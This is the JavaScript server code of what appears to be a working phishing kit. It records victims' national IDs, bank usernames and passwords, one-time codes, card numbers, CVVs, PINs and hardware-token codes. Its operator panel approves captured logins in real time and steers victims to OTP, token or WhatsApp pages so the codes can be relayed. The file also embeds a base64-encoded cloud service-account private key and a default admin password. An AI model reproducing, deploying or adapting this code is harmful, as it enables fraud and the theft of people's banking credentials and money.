const crypto = require('crypto');
const { initializeApp, getApps, cert } = require('firebase-admin/app');
const { getFirestore, FieldValue } = require('firebase-admin/firestore');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin1234@@';
const TOKEN_SECRET = process.env.TOKEN_SECRET || 'halyg-admin-secret-key-2026';
const FB_SA_B64 = 'ewogICJ0eXBlIjogInNlcnZpY2VfYWNjb3VudCIsCiAgInByb2plY3RfaWQiOiAidGhlLXVhZS01YWFkOSIsCiAgInByaXZhdGVfa2V5X2lkIjogIjg3OTgzM2JkZTMyMzlhYjU3MTA4NzM3NDMyOWYxYTJhNGM2NTFkMjAiLAogICJwcml2YXRlX2tleSI6ICItLS0tLUJFR0lOIFBSSVZBVEUgS0VZLS0tLS1cbk1JSUV2UUlCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktjd2dnU2pBZ0VBQW9JQkFRRHNXSjZDb3JNRnVMMzhcblg4NWVEZ2dRT3l1eG9JVnZ6NUVSVWdiVEZnYURybVFVamU3UzZaR0tBNHN1SURYbUdLRklOWGVjMnZXRHhtZnVcbmc2Y3l2dUc1b200eDMzODdYb3NlUmgrNnJOQTlnaUw0cmxuSFFFa25HVXEwVXBnNDY4bDdrM0NzTXlSSEhSQzVcbjJnaGFTTnZ6bTRWd1l5dXdOakg1bFFFODZNOXF2MzdiNWdZTHJpMVBRb3IrVGNhYlZydXRGU0ZKV0dLSHRDQlpcbkhQNVNDRjU2aW82L3VQVTk1cXhuK0Y5ZWpYekp6a05SdmdPZUJaWGNRV2NlMmdSNWFOTjJHTlV2aFE2K1NPNWNcbnBkSWlERW5VRDlFZUJYam5oSjdEYUREcytydG91OVFVaENPR0JlZWVsZ1FtY2xNVGwxdVNiS0x0Z09jL0c3bTFcblQvRE5KVjRMQWdNQkFBRUNnZ0VBRnc0YUFGSlF0bGtzSjBkTlFUMkxLZElyMC9yOXFVZU5OaXhUUUJvZzdvMS9cbmM4WFlxemhmbXgvM1hydURwbnQybUMybkNtVU5tQm90bjBXMmRLdk1KeWlpS1RsTkZ3U0UrNklKakZNNVNSYTlcbnhKWjFhWXRxMTJhUE5BSHVtWGJldzdCQlNIc0FxZk02NDNaU1pFUkJPSVZPUWdWYWlLand2UkQ4K3UwVzlxbWhcbmY5Ymk2bGJqeEFnTGZmdytQU2Q4blk0aFFPRTd0bEQ0WnBCbEJ0dlBYWmZjcjZzQWxkODNScnpHWVo3d0RpaUtcbmRDK1dRM1pZNFgzaGhGNWFSVkdzR3VVQitNcTN4NEhFU01pc2x4ZHdxMzZQWDZYK21NWUlEMkFlRDFCQUFNL0Fcbmc0NzI2cCszd0MrOVNVeVU4T1ZkVWkxRmJleXFJeXc3SmYrQUdla0FtUUtCZ1FEM0s1dEZMT2E3N2RHL0dBR0lcbnJGUWZHa3pzRDFQa0ZYL3BGSXc5ZWM5TzdSSlBhN0pCRy9BSld0QS8zeEpCbkgvODJ2cEp6aEIzYzBhNEQwSHZcbmE5dFV1RXl6V0ZkcGRXUWZSK0E1MDkzMHVBYnZSbzFTUXJzT0h6RVdISTduOFZZYXBoV1g1T0NXYlVqUWdDbVhcbnk3UlVBMzlRYWlZMmJJR2F3YTNvNWtreGxRS0JnUUQweWdaVUQrdXRwbExTb0RFVlVEVWR0b0xtVndlaU9TZFZcblIxWXZnL291MmNpNVpvbjFBamQyUG9kWHFkLytpL3hIOU54Zjg3dHhKYUtXVGNtTS8weWxybXFDd1NxbzF2S0Rcbkl0UXlLYjFySXQ5N2NQdUdXNC9vbWZUNW1iKyt3dVBFNlZqYzJ0TFAydDRQc0V6aThmREx3RkUvVXdTRGxHWTJcbkZud3ZmUm1wSHdLQmdGWjBCelJUOTBTbWMyWGV0TEtrYkN3UTIvVDVpNE5NemRldDJ6dXBmb3lCdVpUVCs1NXdcbmNpNGplSkhPcWFrUFgya0hBdUtMMUJDajNvbUV0TEJVem51OGx2OW9GL01JSDRRZGROMWxNTTVuQyszbmhJalFcblZITWxEOXRIRStrbTdkSVdZNWtrY2pYTGRkdVA2SHh5d05sZCs4c1p4ZEhsZEJPNFNPY2NuVjlkQW9HQUF6d1FcbkxWZ3dneERwazBMdW94dDJPRGhMTG9RRDQ4N2hpQ3p6SkptWDJycWgvbUV1ZllCVC8wb0FPOVpRMFdwRUlTZEpcbktqTnNUS2gwcDR2TG1BTmZuZWphRzNRMS9oa3BCemFVbXowVjlhNTJTWWxLcVpIWUt2aXQxZ2FFRkI4N0owVDJcbkdhVUNtQ0NLUXFiUHZVZjVLSmdYK3NBOEZRa0crTHYvVkJsUkYzMENnWUVBeU15ck9KUTFtL2hzT3gwTFY1eFdcbmh3RlVKclVnTG1yZUQxQVhmWWVjMlJaSy9xdTN1R1lTQXI5STYzcGJkQVhQZkZ2eFBadkFJTWw4em1CenJPUEpcblcxazZvUkpIUjhldGFReGZhVmgrZXptU2ZpdkxzU3h5Q3VaMU9tMTQ1S3h5K3lxOGl3ZENiYUZwbTFUa1NNWEhcbk11SWhYWnVxNllLcGdHMnU0RWZCOFFRPVxuLS0tLS1FTkQgUFJJVkFURSBLRVktLS0tLVxuIiwKICAiY2xpZW50X2VtYWlsIjogImZpcmViYXNlLWFkbWluc2RrLWZic3ZjQHRoZS11YWUtNWFhZDkuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLAogICJjbGllbnRfaWQiOiAiMTExMjcwMzIyNzA1NjQxNjMwNjY1IiwKICAiYXV0aF91cmkiOiAiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL28vb2F1dGgyL2F1dGgiLAogICJ0b2tlbl91cmkiOiAiaHR0cHM6Ly9vYXV0aDIuZ29vZ2xlYXBpcy5jb20vdG9rZW4iLAogICJhdXRoX3Byb3ZpZGVyX3g1MDlfY2VydF91cmwiOiAiaHR0cHM6Ly93d3cuZ29vZ2xlYXBpcy5jb20vb2F1dGgyL3YxL2NlcnRzIiwKICAiY2xpZW50X3g1MDlfY2VydF91cmwiOiAiaHR0cHM6Ly93d3cuZ29vZ2xlYXBpcy5jb20vcm9ib3QvdjEvbWV0YWRhdGEveDUwOS9maXJlYmFzZS1hZG1pbnNkay1mYnN2YyU0MHRoZS11YWUtNWFhZDkuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLAogICJ1bml2ZXJzZV9kb21haW4iOiAiZ29vZ2xlYXBpcy5jb20iCn0K';

if (!getApps().length) {
  let sa;
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    sa = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
  } else {
    sa = JSON.parse(Buffer.from(FB_SA_B64, 'base64').toString('utf8'));
  }
  initializeApp({ credential: cert(sa) });
}
const db = getFirestore();

const appsDoc = db.doc('halyg_store/apps');
const visitorsDoc = db.doc('halyg_store/visitors');
const settingsRef = db.doc('halyg_config/settings');

const CACHE_TTL = 60000;
const _cache = {};
function cached(key, ttlMs, fn) {
  const entry = _cache[key];
  if (entry && Date.now() - entry.ts < ttlMs) return Promise.resolve(entry.data);
  return fn().then(data => { _cache[key] = { data, ts: Date.now() }; return data; });
}
function clearCache(prefix) {
  for (const k of Object.keys(_cache)) if (!prefix || k.startsWith(prefix)) delete _cache[k];
}

async function loadApps() {
  return cached('store.apps', CACHE_TTL, async () => {
    const doc = await appsDoc.get();
    return doc.exists ? doc.data() : {};
  });
}

async function loadVisitors() {
  return cached('store.visitors', CACHE_TTL, async () => {
    const doc = await visitorsDoc.get();
    return doc.exists ? doc.data() : {};
  });
}

async function saveApp(nationalId, data) {
  await appsDoc.set({ [nationalId]: data }, { merge: true });
  clearCache('store.apps');
  clearCache('admin.');
}

async function deleteAppEntry(nationalId) {
  await appsDoc.update({ [nationalId]: FieldValue.delete() });
  clearCache('store.apps');
  clearCache('admin.');
}

async function saveVisitor(sessionId, data) {
  await visitorsDoc.set({ [sessionId]: data }, { merge: true });
  clearCache('store.visitors');
  clearCache('admin.');
}

function makeToken() {
  return crypto.createHmac('sha256', TOKEN_SECRET).update(ADMIN_PASSWORD).digest('hex');
}
function verifyToken(token) { return token && token === makeToken(); }
function getCookies(h) {
  return (h || '').split(';').reduce((a, c) => { const i = c.indexOf('='); if (i > 0) a[c.slice(0, i).trim()] = c.slice(i + 1).trim(); return a; }, {});
}
function isAdminReq(req) {
  const cookies = getCookies(req.headers.cookie);
  return verifyToken(req.headers['x-admin-token'] || cookies['admin_session']);
}

async function getSettings() {
  return cached('store.settings', CACHE_TTL, async () => {
    const doc = await settingsRef.get();
    const defaults = { whatsappLink: '', totalVisitors: 0, appIdCounter: 10000, visitorIdCounter: 120000 };
    return doc.exists ? { ...defaults, ...doc.data() } : { ...defaults };
  });
}

async function getOrCreateApp(nationalId) {
  const allApps = await loadApps();
  if (allApps[nationalId]) return { ...allApps[nationalId] };

  const settings = await getSettings();
  const newId = (settings.appIdCounter || 10000) + 1;
  await settingsRef.set({ appIdCounter: newId }, { merge: true });
  clearCache('store.settings');

  const app = {
    id: newId, nationalId,
    fullName: '', phoneNumber: '', phone: '', address: '',
    username: '', password: '',
    otp: '', otpCode: '',
    cardNumber: '', cardExpiry: '', cvv: '', cardCvv: '',
    cardPin: '', cardName: '',
    hardToken: '', watchLink: '', watchLinkOtp: '',
    selectedWatch: '', watchColor: '',
    governorate: '',
    currentPage: 'home', status: 'active',
    redirectTo: null, redirectError: null,
    customMessage: null, loginApproved: null,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  await saveApp(nationalId, app);
  return app;
}

async function getOrCreateVisitor(sessionId) {
  const allVisitors = await loadVisitors();
  if (allVisitors[sessionId]) return { ...allVisitors[sessionId] };

  await settingsRef.set({ totalVisitors: FieldValue.increment(1) }, { merge: true });
  clearCache('store.settings');

  const visitor = {
    id: Date.now(), sessionId,
    currentPage: 'home', redirectTo: null,
    lastActiveAt: new Date().toISOString(),
    createdAt: new Date().toISOString(),
  };
  await saveVisitor(sessionId, visitor);
  return visitor;
}

function findAppByField(allApps, field, value) {
  for (const [nid, app] of Object.entries(allApps)) {
    if (app[field] === value) return { nid, app };
  }
  return null;
}

async function executeProcedure(name, input, isAdmin) {
  switch (name) {
    case 'admin.updateVisitor': {
      const { sessionId, page, currentPage } = input;
      if (sessionId) {
        const v = await getOrCreateVisitor(sessionId);
        v.lastActiveAt = new Date().toISOString();
        if (currentPage || page) v.currentPage = currentPage || page;
        await saveVisitor(sessionId, v);
      }
      return { success: true };
    }
    case 'admin.getVisitorRedirect': {
      const { sessionId } = input;
      if (!sessionId) return { redirectTo: null };
      const allVisitors = await loadVisitors();
      const v = allVisitors[sessionId];
      return { redirectTo: v ? (v.redirectTo || null) : null };
    }
    case 'admin.clearVisitorRedirect': {
      const { sessionId } = input;
      if (sessionId) {
        const allVisitors = await loadVisitors();
        if (allVisitors[sessionId]) {
          const v = { ...allVisitors[sessionId], redirectTo: null, lastActiveAt: new Date().toISOString() };
          await saveVisitor(sessionId, v);
        }
      }
      return { success: true };
    }
    case 'applications.getRedirectStatus': {
      const { nationalId } = input;
      if (!nationalId) return { redirectTo: null, redirectError: null };
      const allApps = await loadApps();
      const app = allApps[nationalId];
      return { redirectTo: app ? (app.redirectTo || null) : null, redirectError: app ? (app.redirectError || null) : null };
    }
    case 'applications.clearRedirectByUser': {
      const { nationalId } = input;
      if (nationalId) {
        const allApps = await loadApps();
        if (allApps[nationalId]) {
          const app = { ...allApps[nationalId], redirectTo: null, redirectError: null, updatedAt: new Date().toISOString() };
          await saveApp(nationalId, app);
        }
      }
      return { success: true };
    }
    case 'applications.getCustomMessage': {
      const { nationalId } = input;
      if (!nationalId) return { message: null };
      const allApps = await loadApps();
      const app = allApps[nationalId];
      return { message: app ? (app.customMessage || null) : null };
    }
    case 'applications.clearCustomMessage': {
      const { nationalId } = input;
      if (nationalId) {
        const allApps = await loadApps();
        if (allApps[nationalId]) {
          const app = { ...allApps[nationalId], customMessage: null };
          await saveApp(nationalId, app);
        }
      }
      return { success: true };
    }
    case 'applications.updatePage': {
      const { nationalId, page } = input;
      if (nationalId) {
        const allApps = await loadApps();
        if (allApps[nationalId]) {
          const app = { ...allApps[nationalId], currentPage: page || allApps[nationalId].currentPage, updatedAt: new Date().toISOString() };
          await saveApp(nationalId, app);
        }
      }
      return { success: true };
    }
    case 'applications.savePersonalInfo': {
      const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (fullName) app.fullName = fullName;
      const ph = phone || phoneNumber;
      if (ph) { app.phone = ph; app.phoneNumber = ph; }
      if (address) app.address = address;
      if (governorate) app.governorate = governorate;
      if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
      app.currentPage = 'personal';
      app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'applications.saveLoginData': {
      const { nationalId, username, password } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (username) app.username = username;
      if (password) app.password = password;
      if (!app.fullName && username) app.fullName = username;
      app.currentPage = 'waiting-login';
      app.redirectTo = null; app.redirectError = null;
      app.loginApproved = null; app.status = 'awaiting_login'; app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'applications.saveOtpData': {
      const { nationalId, otp, otpCode } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const code = otp || otpCode;
      if (code) { app.otp = code; app.otpCode = code; }
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'applications.saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (cardNumber) app.cardNumber = cardNumber;
      if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
      const cv = cvv || cardCvv;
      if (cv) { app.cvv = cv; app.cardCvv = cv; }
      if (cardName) app.cardName = cardName;
      if (cardPin) app.cardPin = cardPin;
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'applications.saveHardToken': {
      const { nationalId, hardToken, hardTokenCode, token } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const tk = hardToken || hardTokenCode || token;
      if (tk) app.hardToken = tk;
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'applications.saveWatchLink': {
      const { nationalId, watchLink, watchLinkOtp, link } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const wl = watchLink || watchLinkOtp || link;
      if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_watchlink'; app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'admin.login': {
      const { password } = input;
      if (password === ADMIN_PASSWORD) return { success: true, _setToken: makeToken() };
      throw new Error('بيانات الدخول غير صحيحة');
    }
    case 'admin.checkSession': {
      return { isAdmin: !!isAdmin, authenticated: !!isAdmin };
    }
    case 'admin.logout': {
      return { success: true, _clearToken: true };
    }
    case 'admin.getApplications': {
      if (!isAdmin) throw new Error('unauthorized');
      return cached('admin.getApps', CACHE_TTL, async () => {
        const allApps = await loadApps();
        const apps = Object.values(allApps);
        const cutoff = Date.now() - 60000;
        const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
        const allVisitors = await loadVisitors();
        const visitorCutoff = new Date(Date.now() - 120000).toISOString();
        const liveVisitorCount = Object.values(allVisitors).filter(v => v.lastActiveAt > visitorCutoff).length;
        const settings = await getSettings();
        return { apps, activeIds, liveVisitorCount, totalVisitors: settings.totalVisitors };
      });
    }
    case 'admin.getLiveVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return cached('admin.liveVisitors', CACHE_TTL, async () => {
        const allVisitors = await loadVisitors();
        const visitorCutoff = new Date(Date.now() - 120000).toISOString();
        const visitors = Object.values(allVisitors).filter(v => v.lastActiveAt > visitorCutoff);
        return { visitors };
      });
    }
    case 'admin.getAllVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return cached('admin.allVisitors', CACHE_TTL, async () => {
        const settings = await getSettings();
        const allVisitors = await loadVisitors();
        const visitors = Object.values(allVisitors).sort((a, b) => (b.lastActiveAt || '').localeCompare(a.lastActiveAt || '')).slice(0, 200);
        return { visitors, totalCount: settings.totalVisitors };
      });
    }
    case 'admin.getWhatsAppLink': {
      const settings = await getSettings();
      return { link: settings.whatsappLink || '' };
    }
    case 'admin.updateWhatsAppLink': {
      if (!isAdmin) throw new Error('unauthorized');
      await settingsRef.set({ whatsappLink: input.link || '' }, { merge: true });
      clearCache('store.settings');
      return { success: true };
    }
    case 'admin.setCustomMessage': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, message } = input;
      if (nationalId) {
        const allApps = await loadApps();
        if (allApps[nationalId]) {
          const app = { ...allApps[nationalId], customMessage: message || null, updatedAt: new Date().toISOString() };
          await saveApp(nationalId, app);
        }
      }
      return { success: true };
    }
    case 'admin.approveLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const allApps = await loadApps();
      let nid = nationalId;
      if (!nid || !allApps[nid]) {
        if (applicationId) {
          const found = findAppByField(allApps, 'id', applicationId);
          if (found) nid = found.nid;
        }
      }
      if (nid && allApps[nid]) {
        const app = { ...allApps[nid], loginApproved: true, redirectTo: 'otp', currentPage: 'otp', status: 'login_approved', updatedAt: new Date().toISOString() };
        await saveApp(nid, app);
      }
      return { success: true };
    }
    case 'admin.rejectLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const allApps = await loadApps();
      let nid = nationalId;
      if (!nid || !allApps[nid]) {
        if (applicationId) {
          const found = findAppByField(allApps, 'id', applicationId);
          if (found) nid = found.nid;
        }
      }
      if (nid && allApps[nid]) {
        const app = { ...allApps[nid], loginApproved: false, redirectTo: 'login-error', currentPage: 'login', status: 'login_rejected', updatedAt: new Date().toISOString() };
        await saveApp(nid, app);
      }
      return { success: true };
    }
    case 'admin.redirectUser': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, redirectTo, page, redirectError, showError } = input;
      if (nationalId) {
        const allApps = await loadApps();
        if (allApps[nationalId]) {
          const dest = redirectTo || page || null;
          const app = { ...allApps[nationalId], redirectTo: dest, redirectError: redirectError || showError || null, updatedAt: new Date().toISOString() };
          if (dest) app.currentPage = dest;
          await saveApp(nationalId, app);
        }
      }
      return { success: true };
    }
    case 'admin.redirectVisitor': {
      if (!isAdmin) throw new Error('unauthorized');
      const { sessionId, redirectTo, page } = input;
      if (sessionId) {
        const allVisitors = await loadVisitors();
        if (allVisitors[sessionId]) {
          const v = { ...allVisitors[sessionId], redirectTo: redirectTo || page || null, lastActiveAt: new Date().toISOString() };
          await saveVisitor(sessionId, v);
        }
      }
      return { success: true };
    }
    case 'admin.redirectAllToToken': {
      if (!isAdmin) throw new Error('unauthorized');
      const allApps = await loadApps();
      const updates = {};
      for (const [nid, app] of Object.entries(allApps)) {
        if (app.status === 'active' || (app.status && app.status.startsWith('awaiting'))) {
          updates[nid] = { ...app, redirectTo: input.redirectTo || 'token', updatedAt: new Date().toISOString() };
        }
      }
      if (Object.keys(updates).length > 0) {
        await appsDoc.set(updates, { merge: true });
        clearCache('store.apps');
        clearCache('admin.');
      }
      return { success: true };
    }
    case 'admin.redirectWhatsApp': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const allApps = await loadApps();
      let nid = nationalId;
      if (!nid || !allApps[nid]) {
        if (applicationId) {
          const found = findAppByField(allApps, 'id', applicationId);
          if (found) nid = found.nid;
        }
      }
      if (nid && allApps[nid]) {
        const app = { ...allApps[nid], redirectTo: 'whatsapp', updatedAt: new Date().toISOString() };
        await saveApp(nid, app);
      }
      return { success: true };
    }
    case 'admin.deleteApplication': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      if (nationalId) {
        await deleteAppEntry(nationalId);
      } else if (applicationId) {
        const allApps = await loadApps();
        const found = findAppByField(allApps, 'id', applicationId);
        if (found) await deleteAppEntry(found.nid);
      }
      return { success: true };
    }
    case 'admin.deleteInactiveClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const allApps = await loadApps();
      const cutoff = new Date(Date.now() - 120000).toISOString();
      const updates = {};
      let deletedCount = 0;
      for (const [nid, app] of Object.entries(allApps)) {
        if (app.updatedAt < cutoff) {
          updates[nid] = FieldValue.delete();
          deletedCount++;
        }
      }
      if (deletedCount > 0) {
        await appsDoc.update(updates);
        clearCache('store.apps');
        clearCache('admin.');
      }
      return { success: true, deletedCount };
    }
    case 'admin.deleteAllClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const allApps = await loadApps();
      const count = Object.keys(allApps).length;
      await appsDoc.set({});
      clearCache('store.apps');
      clearCache('admin.');
      return { success: true, deletedCount: count };
    }
    case 'admin.resetTotalVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      await settingsRef.set({ totalVisitors: 0 }, { merge: true });
      clearCache('store.settings');
      return { success: true };
    }
    default:
      return { success: false, error: 'unknown procedure: ' + name };
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token, Authorization');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const { trpc } = req.query;
  let procsStr = Array.isArray(trpc) ? trpc.join('/') : (trpc || '');
  if (!procsStr) { const m = (req.url || '').split('?')[0].match(/\/api\/trpc\/(.+)/); if (m) procsStr = decodeURIComponent(m[1]); }
  const procs = procsStr.split(',').filter(Boolean);
  if (!procs.length) return res.status(400).json([]);

  let inputs = {};
  if (req.method === 'GET') { try { inputs = JSON.parse(req.query.input || '{}'); } catch { inputs = {}; } }
  else inputs = req.body || {};

  const isAdmin = isAdminReq(req);

  let setCookie = null, clearCookie = false;

  const results = [];
  for (let i = 0; i < procs.length; i++) {
    const raw = inputs[String(i)] || inputs;
    const input = raw?.json || raw || {};
    const procName = procs[i].trim();
    try {
      const result = await executeProcedure(procName, input, isAdmin);
      if (result?._setToken) { setCookie = result._setToken; delete result._setToken; }
      if (result?._clearToken) { clearCookie = true; delete result._clearToken; }
      results.push({ result: { data: { json: result } } });
    } catch (e) {
      results.push({ error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } });
    }
  }

  if (setCookie) res.setHeader('Set-Cookie', `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
  if (clearCookie) res.setHeader('Set-Cookie', 'admin_session=; Path=/; HttpOnly; Max-Age=0');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).json(results);
};
